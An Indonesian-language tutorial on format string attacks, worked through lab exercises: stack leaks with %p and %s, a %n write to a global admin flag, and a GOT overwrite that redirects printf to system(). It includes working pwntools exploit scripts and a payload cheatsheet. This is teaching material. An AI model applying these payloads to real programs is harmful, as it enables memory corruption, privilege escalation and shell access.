Binary Exploitation — Format String Attack

Dari satu bug printf() → baca dan tulis memori sembarangan

Format String adalah bug paling powerful di binary exploitation — dengan satu kerentanan, attacker mendapat dua primitif sekaligus: arbitrary read (baca memori mana saja) dan arbitrary write (tulis ke memori mana saja). Tanpa overflow sama sekali.

Fondasi — Bug format string terjadi di mana?

Ketika input user langsung jadi format string

Kode AMAN

printf("%s", input);

Format spec tetap, input hanya data

Kode RENTAN

printf(input); // BUG!

Input langsung jadi format string!

Juga rentan:

sprintf(buf, input); // ← rentan fprintf(file, input); // ← rentan syslog(LOG_INFO, input); // ← rentan
Kalau user bisa kontrol format string, ia bisa menyuntikkan specifier seperti %p, %x, %s, %n yang membaca/menulis stack!
Fondasi — Bagaimana printf() bekerja secara internal

printf() membaca argumen dari stack berurutan

Saat printf("%d %d %d", a, b, c) dipanggil, stack terlihat seperti:

c (arg ke-3)esp+12
b (arg ke-2)esp+8
a (arg ke-1)esp+4
pointer ke format string "%d %d %d"esp+0

Setiap %d membuat printf membaca nilai berikutnya dari stack. Kalau tidak ada argumen yang sesuai, printf tetap membaca — apapun yang ada di stack!

Input: printf("%d %d %d %d %d") ← tidak ada argumen sama sekali! → printf baca 5 nilai dari stack secara membabi buta → nilai yang dibaca = isi stack yang "kebetulan" ada di sana
Inilah mengapa format string bisa baca semua isi stack — termasuk canary, return address, pointer ke libc, dll!

Soal 1 — Format String Read (Leak)

Temukan canary dan alamat libc dari stack!

Program berikut memiliki format string vulnerability. Gunakan untuk membaca stack dan temukan nilai canary serta alamat libc!

#include <stdio.h> void vuln() { char buf[64]; printf("Masukkan nama: "); fgets(buf, 64, stdin); printf(buf); // ← FORMAT STRING BUG! printf("\nDone.\n"); } int main() { vuln(); return 0; }
Skenario pengujian:
Input %p.%p.%p.%p.%p.%p.%p.%p.%p.%p menghasilkan:
0x1.(nil).0x804a000.0xbffff5c0.0xbffff5a8.0xdeadbe00.0xbffff634.0x80484f2.0xb7e52960.0x0
Diketahui: canary selalu berakhiran \x00. Libc puts() offset dari libc base = 0x67360

Pertanyaan: (1) Di parameter ke berapa canary? (2) Di parameter ke berapa libc addr? (3) Hitung libc base!

Kita tahu nilai yang bocor = 0xb7e52960. Tapi fungsi apa ini? Dari soal, diketahui ini adalah puts() dan offset puts dari libc base = 0x67360.

Langkah 4 — Cara membaca string dari alamat sembarang

%s membaca string dari pointer yang ada di stack

Selain %p, kita bisa pakai %s untuk membaca string dari alamat yang ditunjuk oleh nilai di stack. Ini lebih powerful — bisa baca konten memori, bukan hanya nilai angka.

Misalkan parameter ke-4 berisi 0xbffff5c0 (alamat stack) Input: %4$s → printf membaca string dari alamat 0xbffff5c0 → mencetak isi memori di sana sebagai string!
Hati-hati: %s akan crash kalau pointer tidak valid atau menunjuk ke unmapped memory. Gunakan dengan hati-hati — cek dulu dengan %p.
Teknik ini dipakai untuk membaca: isi variabel tersembunyi, konten file yang dimuat di memori, atau string sensitif seperti password yang ada di heap/stack.

Cara kerja Format String Read

1. Kirim banyak %p untuk dump seluruh stack

2. Identifikasi nilai: canary (diakhiri \x00), libc (mulai 0xb7 di x86), stack (0xbfff)

3. Pakai %K$p untuk direct access ke posisi yang diinginkan

4. Hitung offset: libc_base = leaked - known_offset

5. Pakai %K$s untuk baca string dari alamat yang ditunjuk parameter ke-K

Soal 2 — Format String Write (%n)

Ubah nilai variabel global tanpa overflow!

Program ini cek variabel is_admin untuk memberi akses. Gunakan %n untuk menulis ke variabel itu!

int is_admin = 0; // variabel global di 0x0804a018 void vuln() { char buf[128]; fgets(buf, 128, stdin); printf(buf); // ← format string bug! } int main() { vuln(); if (is_admin) { system("/bin/sh"); } else { puts("Access denied."); } }
is_admin ada di alamat: 0x0804a018
Format string buf ada di parameter ke-: 4 (dari eksperimen %p)
Proteksi: NO ASLR | NO PIE | NO NX | NO Canary

Pertanyaan: Susun format string untuk mengubah is_admin menjadi 1!

Langkah 1 — Cara kerja %n

%n menulis JUMLAH KARAKTER yang sudah diprint ke alamat pointer

%n adalah specifier khusus yang tidak mencetak — ia MENULIS jumlah karakter yang sudah tercetak sejauh ini ke alamat yang ditunjuk oleh argumen berikutnya.

// Contoh penggunaan normal %n: int count; printf("Hello%n World", &count); // "Hello" = 5 karakter → count = 5 // Lanjut print " World" // Output: "Hello World", count = 5

Dalam format string attack:

Kita taruh ALAMAT TARGET di dalam format string itu sendiri (sebagai bagian dari input yang kita kirim) Lalu pakai %K$n untuk tulis ke alamat di parameter ke-K → parameter ke-K akan menunjuk ke alamat target kita
%n menulis ke pointer — bukan ke nilai! Jadi kita perlu menaruh ALAMAT target di dalam format string, lalu %n akan menulis jumlah karakter ke alamat itu.
Langkah 2 — Prinsip write primitive

Tiga langkah untuk menulis ke alamat sembarang

Langkah A: Taruh alamat target di format string
Format string adalah input kita → terletak di stack (dalam buf). Kita bisa memasukkan raw bytes alamat target sebagai bagian dari string.
Langkah B: Cari di mana format string itu sendiri di stack
Karena buf ada di stack, format string yang kita tulis muncul sebagai parameter ke-N. Cari N dengan eksperimen.
Langkah C: Pakai %N$n untuk tulis nilai ke alamat tadi
%N$n membaca parameter ke-N (= alamat yang kita taruh), lalu tulis jumlah karakter yang sudah diprint ke sana.
Soal bilang format string (buf) ada di parameter ke-4. Artinya: 4 byte pertama buf akan terbaca sebagai parameter ke-4!
Langkah 3 — Struktur payload write

Format: [alamat target][format spec untuk print N char][%K$n]

Kita ingin tulis nilai 1 ke is_admin di 0x0804a018.

Rencana payload:

[4 byte: 0x0804a018 ← alamat is_admin]buf[0..3]
%Nc (print N karakter supaya total = nilai target)buf[4..]
%4$n (tulis ke parameter ke-4 = alamat di buf[0..3])akhir
Payload = [addr_target][padding untuk kontrol jumlah char][%K$n] Saat printf proses ini: 1. Mencetak alamat 0x0804a018 sebagai data (4 byte) 2. Padding menambah karakter yang tercetak 3. %4$n membaca param ke-4 = 0x0804a018 4. Menulis jumlah char yang sudah tercetak ke alamat 0x0804a018!
Langkah 4 — Hitung jumlah karakter untuk nilai target

Kita ingin %n menulis nilai 1 ke is_admin

%n menulis BERAPA KARAKTER yang sudah tercetak. Kita ingin nilai = 1. Masalah: 4 byte alamat sudah dicetak dulu!

Karakter yang sudah tercetak sebelum %n: - 4 byte alamat (0x0804a018) = 4 karakter - Kita perlu total = 1? Tidak bisa! 4 sudah lebih dari 1. Solusi: target nilai yang lebih besar, misal: - Tulis 0x100 (256) agar is_admin != 0 (tetap true!) - Atau pakai nilai = 4 (sudah 4 karakter dari addr) ← mudah!

Strategi: tulis nilai 4 (sudah 4 karakter dari addr). is_admin = 4 → non-zero → dianggap true!

Payload = [addr 0x0804a018][%4$n] = \x18\xa0\x04\x08 + "%4$n" 4 karakter sudah tercetak (dari addr) saat %4$n → tulis 4 ke is_admin! is_admin = 4 → if(is_admin) = TRUE → shell!
Langkah 5 — Menulis nilai SPESIFIK dengan padding

Kalau ingin is_admin = 0xdeadbeef, pakai padding

Kita bisa menulis nilai APAPUN dengan mengontrol jumlah karakter yang dicetak sebelum %n:

Mau tulis nilai V ke alamat A: 1. Sudah ada N karakter dicetak sebelum %n 2. Perlu cetak (V - N) karakter tambahan 3. Pakai "%Xc" untuk cetak X karakter sekaligus Contoh: tulis 0x41 (65) ke is_admin - 4 byte alamat sudah dicetak (N=4) - Perlu total 65 karakter → tambah 65-4 = 61 karakter - Format: \x18\xa0\x04\x08 + "%61c" + "%4$n"
from pwn import * p = process('./vuln') target_addr = 0x0804a018 # alamat is_admin target_val = 1 # nilai yang ingin ditulis fmt_offset = 4 # buf ada di param ke-4 # Hitung padding: total_chars_needed - len(addr) addr_bytes = p32(target_addr) # 4 byte padding_len = target_val - len(addr_bytes) # Kalau target_val < 4, tambah 0x100 (masih non-zero!) if padding_len < 0: target_val += 0x100 padding_len = target_val - len(addr_bytes) payload = addr_bytes payload += (f"%{padding_len}c").encode() payload += (f"%{fmt_offset}$n").encode() p.sendline(payload) p.interactive() # → shell!
Langkah 6 — Menulis nilai besar: %hn (2 byte) dan %hhn (1 byte)

Tulis nilai besar dengan memecah jadi beberapa write

Menulis nilai besar seperti 0xdeadbeef membutuhkan mencetak 3,735,928,559 karakter — tidak praktis! Solusinya: pecah menjadi 2 atau 4 write terpisah.

SpecifierUkuran writeNilai maxKapan dipakai
%n4 byte (int)0xFFFFFFFFNilai kecil < 0x1000
%hn2 byte (short)0xFFFFTulis 2 byte sekaligus
%hhn1 byte (char)0xFFPaling presisi, paling umum
Untuk tulis 0xdeadbeef ke alamat A: - Tulis 0xef ke A+0 dengan %hhn (cetak 0xef = 239 char) - Tulis 0xbe ke A+1 dengan %hhn (cetak 0xbe = 190 char) - Tulis 0xad ke A+2 dengan %hhn (cetak 0xad = 173 char) - Tulis 0xde ke A+3 dengan %hhn (cetak 0xde = 222 char)
Ini disebut "byte-by-byte write" atau "split write". Kompleks tapi sangat powerful — bisa tulis nilai apapun ke alamat apapun!
Langkah 7 — Ringkasan Format String Write
Payload untuk is_admin = 4
\x18\xa0\x04\x08 + "%4$n"
4 byte alamat + langsung %4$n = 4 char tercetak = is_admin jadi 4

Cara kerja Format String Write

1. Taruh alamat target di awal format string (sebagai raw bytes)

2. Cari offset: buf ada di parameter ke berapa (%1$p, %2$p, ...)

3. Hitung: perlu cetak berapa char sebelum %n agar nilainya = target

4. Pakai %Xc untuk cetak X char sekaligus

5. %K$n tulis jumlah char ke addr di parameter ke-K

Nilai yang ditulis = total karakter yang tercetak sebelum %n

Soal 3 — GOT Overwrite (Teknik Paling Powerful)

Overwrite GOT untuk redirect fungsi ke target!

GOT (Global Offset Table) adalah tabel pointer yang dipakai untuk memanggil fungsi libc. Kalau kita bisa overwrite GOT[puts] dengan alamat system(), maka setiap panggilan puts() akan jadi system()!

void vuln() { char buf[128]; fgets(buf, 128, stdin); printf(buf); // ← format string bug puts("Done!"); // ← ini yang akan kita redirect! }
GOT[puts] = 0x0804a010 (dari readelf/pwntools)
system() = 0xb7e52070 (ASLR off)
"/bin/sh" sudah ada di libc: 0xb7f6d4af
buf ada di format string param ke-: 4
Proteksi: Partial RELRO (GOT writable!) | NO ASLR | NO Canary

Susun payload untuk overwrite GOT[puts] dengan alamat system() sehingga puts("Done!") → system("Done!") ... tapi kita butuh "/bin/sh"!

Langkah 1 — Apa itu GOT dan PLT?

GOT = tabel alamat fungsi external yang bisa dimodifikasi

Saat program memanggil puts("Done!"), yang terjadi sebenarnya:

; Assembly: panggil puts call puts@PLT ; loncat ke PLT entry ; Di PLT entry: jmp [GOT[puts]] ; baca alamat dari GOT, loncat ke sana ; GOT[puts] awalnya berisi alamat puts() di libc: GOT[puts] = 0xb7e52960 ; → loncat ke puts() di libc ; SETELAH kita overwrite: GOT[puts] = 0xb7e52070 ; → loncat ke system()! ; puts("Done!") sekarang jadi system("Done!") ← string "Done!" jadi arg!
GOT overwrite mengubah SEMUA panggilan ke puts() menjadi panggilan ke system(). Ini permanen sampai program restart!
Langkah 2 — Masalah argumen dan solusinya

puts("Done!") → system("Done!") — bukan /bin/sh!

Kalau kita hanya overwrite GOT[puts], maka puts("Done!") akan jadi system("Done!"). "Done!" bukan command yang valid.

Beberapa solusi:

Solusi 1: Overwrite GOT[printf] bukan puts
printf(buf) → kalau buf = "/bin/sh", maka setelah overwrite: system("/bin/sh")!
Solusi 2: Dua tahap — overwrite dua fungsi
Overwrite GOT[puts] = system, dan panggil puts("/bin/sh") eksplisit lewat bug lain
Solusi 3 (paling umum): Overwrite GOT[exit] = win function
exit() dipanggil banyak tempat → satu overwrite bisa trigger dari mana saja
Langkah 3 — Strategi: overwrite GOT[printf] dengan system

Karena printf(buf) → kalau buf="/bin/sh" → system("/bin/sh")

Rencana dua tahap:

Tahap 1: Format string pertama
Overwrite GOT[printf] = system(). Setelah ini, setiap printf() jadi system()!
Tahap 2: Input kedua = "/bin/sh"
Program kembali ke loop dan baca input lagi. Kita kirim "/bin/sh". printf("/bin/sh") → system("/bin/sh") → SHELL!

Nilai yang perlu ditulis: system() = 0xb7e52070. Terlalu besar untuk satu %n. Kita pakai dua %hn (2 byte masing-masing):

0xb7e52070 dipecah: - 2 byte bawah: 0x2070 = 8304 desimal → tulis ke GOT[printf]+0 - 2 byte atas: 0xb7e5 = 47077 desimal → tulis ke GOT[printf]+2
Langkah 4 — Susun payload GOT overwrite

Payload dengan dua %hn untuk tulis 4 byte

from pwn import * p = process('./vuln') elf = ELF('./vuln') # Alamat dari ELF got_printf = elf.got['printf'] # alamat GOT[printf] system_addr = 0xb7e52070 # Pecah system() jadi dua 2-byte chunk low = system_addr & 0xffff # 0x2070 = 8304 high = (system_addr >> 16) & 0xffff # 0xb7e5 = 47077 # Dua alamat yang akan ditulis: addr_low = p32(got_printf) # GOT[printf]+0 (tulis 2 byte bawah) addr_high = p32(got_printf + 2) # GOT[printf]+2 (tulis 2 byte atas) # Payload: # [addr_low][addr_high] = 8 byte header # Lalu: cetak (low - 8) char, %4$hn # cetak (high - low) char, %5$hn fmt_low = low - 8 # sudah 8 char dari header fmt_high = high - low # tambahan untuk total = high payload = addr_low + addr_high payload += (f"%{fmt_low}c%4$hn").encode() payload += (f"%{fmt_high}c%5$hn").encode() p.sendline(payload) p.sendline(b'/bin/sh') # → printf("/bin/sh") → system("/bin/sh")! p.interactive()

Urutan exploit format string di soal

Cheatsheet — Cara kerja tiap format specifier

Satu tabel untuk semua yang perlu diingat

═══════════════════════════════════════════ FORMAT STRING CHEATSHEET ═══════════════════════════════════════════ READ primitif: %p → print pointer (4/8 byte hex) dari stack %x → print unsigned hex 32-bit %K$p → baca param ke-K langsung (direct access) %K$s → baca STRING dari addr di param ke-K WRITE primitif: %n → tulis 4 byte: jumlah char tercetak %hn → tulis 2 byte (short) %hhn → tulis 1 byte (char) %K$n → tulis ke addr di param ke-K %Nc → cetak N char (kontrol nilai untuk %n) Payload write ke addr A, nilai V: payload = p32(A) + f"%{V-4}c%4$n" (asumsi buf ada di param ke-4, addr = 4 byte) Payload write nilai besar (split 2 byte): low = V & 0xffff high = (V >> 16) & 0xffff payload = p32(A) + p32(A+2) payload += f"%{low-8}c%4$hn" payload += f"%{high-low}c%5$hn"
Cara menemukan offset buf di stack

Metode AAAA trick — cari posisi buf

# Kirim "AAAA" + banyak %p untuk cari buf di stack # AAAA dalam hex = 0x41414141 Input: AAAA.%1$p.%2$p.%3$p.%4$p.%5$p.%6$p Output: AAAA.0x1.0xf7f3.0x804a000.0x41414141.0xbffff5c0.0x0 # ↑ ini dia! = 0x41414141 = "AAAA" # buf ada di parameter ke-4! # Atau lebih efisien dengan pwntools: from pwn import * p = process('./vuln') p.sendline(b'AAAA.' + b'%p.' * 20) output = p.recvline() # Cari 0x41414141 di output → itu offset-nya offset = output.split(b'.').index(b'0x41414141') + 1 print(f"buf offset: {offset}")
